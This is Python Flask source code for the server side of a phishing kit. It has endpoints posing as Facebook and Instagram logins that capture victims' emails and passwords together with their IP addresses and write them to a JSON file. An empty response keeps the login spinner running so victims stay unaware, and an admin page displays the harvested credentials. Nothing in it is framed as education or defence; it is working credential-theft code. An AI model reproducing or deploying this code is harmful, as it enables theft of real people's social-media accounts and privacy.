from flask import Flask, request, jsonify, render_template, redirect, url_for
from flask_cors import CORS
from datetime import datetime
import json
import os

app = Flask(__name__)
CORS(app)  # Enable cross-origin requests

# JSON file to store credentials
CREDENTIALS_FILE = 'credentials.json'

# Load existing credentials from file
def load_credentials():
    if os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, 'r') as f:
            return json.load(f)
    return []

# Save credentials to file
def save_credentials(credentials):
    with open(CREDENTIALS_FILE, 'w') as f:
        json.dump(credentials, f, indent=2)

# Load credentials on startup
credentials_log = load_credentials()

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>404 - Not Found</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
            h1 { color: #666; }
            p { color: #999; }
        </style>
    </head>
    <body>
        <h1>404 - lol, hahahaha,</h1>
        <p>The page you're looking for does not exist.</p>
    </body>
    </html>
    ''', 404

@app.route('/api/hello', methods=['POST'])
def hello_api():
    data = request.get_json()
    name = data.get('name', 'World')
    return jsonify({'message': f'Hello, {name}!', 'status': 'success'})

@app.route('/api/users', methods=['GET', 'POST'])
def users_api():
    if request.method == 'POST':
        data = request.get_json()
        return jsonify({'message': 'User created', 'user': data, 'status': 'success'})
    return jsonify({'users': ['John', 'Jane', 'Bob'], 'status': 'success'})

@app.route('/api/facebook-login', methods=['POST'])
def facebook_login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Store credentials
    credentials_log.append({
        'platform': 'Facebook',
        'email': email,
        'password': password,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': request.remote_addr
    })
    
    # Save to JSON file
    save_credentials(credentials_log)
    
    print(f"\n=== FACEBOOK LOGIN ===")
    print(f"Email: {email}")
    print(f"Password: {password}")
    print(f"======================\n")
    
    # Return empty response to keep spinner spinning
    return '', 204  # No content response

@app.route('/api/instagram-login', methods=['POST'])
def instagram_login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Store credentials
    credentials_log.append({
        'platform': 'Instagram',
        'email': email,
        'password': password,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': request.remote_addr
    })
    
    # Save to JSON file
    save_credentials(credentials_log)
    
    print(f"\n=== INSTAGRAM LOGIN ===")
    print(f"Email: {email}")
    print(f"Password: {password}")
    print(f"========================\n")
    
    # Return empty response to keep spinner spinning
    return '', 204  # No content response

@app.route('/admin/credentials')
def view_credentials():
    return render_template('admin.html', 
                         credentials=credentials_log, 
                         total=len(credentials_log))

@app.route('/api/delete-credential/<int:index>', methods=['POST'])
def delete_credential(index):
    global credentials_log
    
    # Check admin password
    admin_password = request.json.get('password', '')
    if admin_password != 'ADMINDELETE':
        return jsonify({'status': 'error', 'message': 'Sorry you can\'t delete this because of your wrong password'})
    
    if 0 <= index < len(credentials_log):
        deleted_item = credentials_log.pop(index)
        save_credentials(credentials_log)
        return jsonify({'status': 'success', 'message': f'Deleted {deleted_item["platform"]} entry'})
    return jsonify({'status': 'error', 'message': 'Invalid index'})

@app.route('/api/clear-all-credentials', methods=['POST'])
def clear_all_credentials():
    global credentials_log
    
    # Check admin password
    admin_password = request.json.get('password', '')
    if admin_password != 'ADMINDELETE':
        return jsonify({'status': 'error', 'message': 'Sorry you can\'t delete this because of your wrong password'})
    
    count = len(credentials_log)
    credentials_log = []
    save_credentials(credentials_log)
    return jsonify({'status': 'success', 'message': f'Deleted all {count} entries'})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)